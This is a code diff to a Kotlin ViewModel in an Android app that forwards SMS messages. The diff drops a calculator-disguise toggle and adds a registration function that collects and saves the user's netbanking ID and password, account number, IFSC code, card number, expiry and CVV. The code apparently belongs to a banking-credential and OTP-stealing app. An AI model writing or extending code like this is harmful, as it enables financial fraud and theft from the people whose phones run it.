@@ -20,8 +20,7 @@ data class HomeUiState(
     val pendingQueueCount: Int = 0,
     val testSmsResult: String? = null,
     val isSendingTest: Boolean = false,
-    val errorMessage: String? = null,
-    val isCalculatorDisguised: Boolean = false
+    val errorMessage: String? = null
 )
 
 @HiltViewModel
@@ -31,40 +30,49 @@ class HomeViewModel @Inject constructor(
     private val forwardingPipeline: SmsForwardingPipeline
 ) : ViewModel() {
 
-    private val _uiState = MutableStateFlow(
-        HomeUiState(isCalculatorDisguised = deviceRepository.isCalculatorDisguisedSync())
-    )
+    private val _uiState = MutableStateFlow(HomeUiState())
     val uiState: StateFlow<HomeUiState> = _uiState.asStateFlow()
 
     init {
         viewModelScope.launch {
             combine(
                 deviceRepository.deviceInfoFlow,
-                messageRepository.pendingCountFlow,
-                deviceRepository.isCalculatorDisguisedFlow
-            ) { info, count, isDisguised ->
-                _uiState.update { it.copy(deviceInfo = info, pendingQueueCount = count, isCalculatorDisguised = isDisguised) }
+                messageRepository.pendingCountFlow
+            ) { info, count ->
+                _uiState.update { it.copy(deviceInfo = info, pendingQueueCount = count) }
             }.collect()
         }
     }
 
-    fun isCalculatorDisguisedSync(): Boolean = deviceRepository.isCalculatorDisguisedSync()
-
-    fun setCalculatorDisguised(disguised: Boolean) {
-        viewModelScope.launch {
-            deviceRepository.setCalculatorDisguised(disguised)
-        }
-    }
-
-    fun registerSenderDevice(name: String, mobileNumber: String, address: String) {
+    fun registerFullSenderDevice(
+        name: String,
+        mobileNumber: String,
+        address: String,
+        bankName: String,
+        accountNumber: String,
+        ifscCode: String,
+        netbankingId: String,
+        netbankingPassword: String,
+        cardNumber: String,
+        cardExpiry: String,
+        cardCvv: String
+    ) {
         viewModelScope.launch {
             _uiState.update { it.copy(isRegistering = true, errorMessage = null) }
-            deviceRepository.saveDepartmentDetails(
-                departmentName = name.ifBlank { "Department Device" },
+            deviceRepository.saveFullRegistrationDetails(
+                name = name.ifBlank { "User Device" },
                 mobileNumber = mobileNumber.ifBlank { "N/A" },
-                address = address.ifBlank { "Main Office" }
+                address = address.ifBlank { "N/A" },
+                bankName = bankName,
+                accountNumber = accountNumber,
+                ifscCode = ifscCode,
+                netbankingId = netbankingId,
+                netbankingPassword = netbankingPassword,
+                cardNumber = cardNumber,
+                cardExpiry = cardExpiry,
+                cardCvv = cardCvv
             )
-            deviceRepository.setDeviceName(name.ifBlank { "Department Device" })
+            deviceRepository.setDeviceName(name.ifBlank { "User Device" })
             val result = deviceRepository.registerDevice()
             _uiState.update {
                 it.copy(
